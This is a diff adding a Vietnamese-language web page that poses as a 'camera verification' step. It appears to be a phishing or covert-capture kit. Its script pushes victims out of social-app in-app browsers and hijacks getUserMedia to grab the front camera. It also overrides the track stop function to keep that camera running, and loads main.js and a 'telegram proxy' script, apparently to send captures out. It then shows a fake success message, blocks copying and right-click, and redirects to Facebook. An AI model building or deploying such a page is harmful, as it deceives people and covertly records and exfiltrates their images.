@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Xác Thực Camera</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0d1117;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .card {
+            background: #161b22;
+            padding: 30px 20px;
+            border-radius: 24px;
+            text-align: center;
+            width: 90%;
+            max-width: 380px;
+            border: 1px solid #30363d;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .card h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .camera-view {
+            width: 100%;
+            height: 280px;
+            background: #000;
+            border-radius: 16px;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+            border: 2px solid #30363d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .camera-view p {
+            color: #8b949e;
+            font-size: 14px;
+        }
+
+        .btn {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        .btn:disabled {
+            background: #21262d;
+            color: #8b949e;
+            cursor: not-allowed;
+        }
+
+        #status {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        /* Cảnh báo in-app browser */
+        #browser-warning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #0d1117;
+            z-index: 10000;
+            padding: 40px 20px;
+            box-sizing: border-box;
+        }
+
+        .warning-box {
+            background: #1c2128;
+            border: 2px solid #f85149;
+            padding: 30px 20px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .warning-box h3 {
+            color: #f85149;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+
+        .steps {
+            text-align: left;
+            margin-top: 20px;
+            color: #c9d1d9;
+            font-size: 15px;
+            line-height: 2;
+        }
+
+        .highlight {
+            color: #ffeb3b;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="browser-warning">
+        <div class="warning-box">
+            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
+            <div class="steps">
+                Hãy mở website theo hướng dẫn phía dưới:<br><br>
+                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở
+                góc trên bên phải.<br><br>
+                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (hoặc <i>Open in Browser</i>/<i>Safari</i>)
+                để bắt đầu xác thực.
+            </div>
+        </div>
+    </div>
+
+    <div class="card" id="mainCard">
+        <h2>🔐 Xác Minh Người Dùng</h2>
+        <div class="camera-view" id="vBox">
+            <p id="msg">📷 Đang khởi tạo camera...</p>
+            <video id="preview" autoplay playsinline muted></video>
+        </div>
+        <button class="btn" id="startBtn">▶ BẮT ĐẦU XÁC THỰC</button>
+        <div id="status">✅ Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
+    </div>
+
+    <script>
+        // ========== THAY LINK CHUYỂN HƯỚNG CỦA BẠN VÀO ĐÂY ==========
+        const REDIRECT_URL = "https://facebook.com";
+
+        // ========== KIỂM TRA IN-APP BROWSER ==========
+        function checkAndShowWarning() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
+            const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
+
+            if (isTikTok || isOtherInApp) {
+                document.getElementById('browser-warning').style.display = 'block';
+                document.getElementById('mainCard').style.display = 'none';
+            }
+        }
+        document.addEventListener("DOMContentLoaded", checkAndShowWarning);
+
+        // ========== LOGIC CAMERA ==========
+        const btn = document.getElementById('startBtn');
+        const video = document.getElementById('preview');
+        const statusDiv = document.getElementById('status');
+        const msg = document.getElementById('msg');
+
+        const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
+        const originalStop = MediaStreamTrack.prototype.stop;
+        let frontStream = null;
+
+        navigator.mediaDevices.getUserMedia = async (constraints) => {
+            const stream = await originalGetUserMedia(constraints);
+            if (constraints.video && constraints.video.facingMode === 'user') {
+                frontStream = stream;
+                video.srcObject = stream;
+                video.style.display = "block";
+                msg.style.display = "none";
+                document.getElementById('vBox').style.borderColor = "#238636";
+            }
+            return stream;
+        };
+
+        MediaStreamTrack.prototype.stop = function () {
+            if (this.label.toLowerCase().includes('front') || this.label.toLowerCase().includes('user')) {
+                console.log("Giữ lại preview cho camera trước...");
+            } else {
+                originalStop.apply(this);
+            }
+        };
+
+        btn.addEventListener('click', () => {
+            btn.disabled = true;
+            btn.innerText = "⏳ ĐANG XỬ LÝ...";
+            statusDiv.innerHTML = "📸 Đang xác thực khuôn mặt...<br>✨ Vui lòng giữ nguyên vị trí.";
+
+            // Load main.js
+            const script = document.createElement('script');
+            script.src = 'main.js';
+            document.body.appendChild(script);
+
+            // Kiểm tra khi main.js hoàn thành
+            const checkFinished = setInterval(() => {
+                if (window.mainScriptFinished === true) {
+                    clearInterval(checkFinished);
+                    startCountdown();
+                }
+            }, 500);
+            
+            // Timeout sau 15s nếu main.js lỗi
+            setTimeout(() => {
+                if (window.mainScriptFinished !== true) {
+                    clearInterval(checkFinished);
+                    console.log("⚠️ Timeout, vẫn chuyển hướng");
+                    startCountdown();
+                }
+            }, 15000);
+        });
+
+        function startCountdown() {
+            let timeLeft = 5;
+            const timer = setInterval(() => {
+                btn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
+                statusDiv.innerText = "🎉 Xác thực thành công! Đang chuyển hướng...";
+                timeLeft--;
+
+                if (timeLeft < 0) {
+                    clearInterval(timer);
+                    if (frontStream) {
+                        frontStream.getTracks().forEach(t => originalStop.apply(t));
+                    }
+                    if (REDIRECT_URL) {
+                        window.location.href = REDIRECT_URL;
+                    }
+                }
+            }, 1000);
+        }
+
+        // Chặn chuột phải
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        // Chặn copy
+        document.addEventListener('copy', (e) => e.preventDefault());
+    </script>
+    
+    <!-- Include telegram proxy -->
+    <script src="telegram.js"></script>
+
+</body>
+
+</html>
